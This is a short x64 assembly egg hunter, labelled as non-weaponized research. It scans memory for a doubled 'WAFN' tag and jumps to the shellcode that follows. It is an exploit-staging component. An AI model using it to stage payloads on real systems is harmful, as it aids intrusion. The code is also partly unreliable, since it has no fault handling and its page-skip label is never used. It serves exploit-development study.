; Win64 Egg Hunter Research
; A simple, non-weaponized hunter logic for learning purposes.
bits 64

_start:
    xor rbx, rbx        ; Initialize RBX as our memory pointer
next_page:
    or bx, 0xfff        ; Page alignment (4096 bytes)
next_addr:
    inc rbx             ; Increment pointer to next address
    
    ; Simple verification (Note: Real-world usage requires SEH or signal handling)
    mov eax, 0x5741464e ; Egg signature: 'WAFN'
    cmp [rbx], eax      ; Compare first 4 bytes
    jne next_addr
    cmp [rbx+4], eax    ; Compare next 4 bytes (Double-tagging)
    jne next_addr
    
    add rbx, 8          ; [CORRECTION] Skip the 8-byte EGG signature before jumping
    jmp rbx             ; Jump to the actual shellcode payload
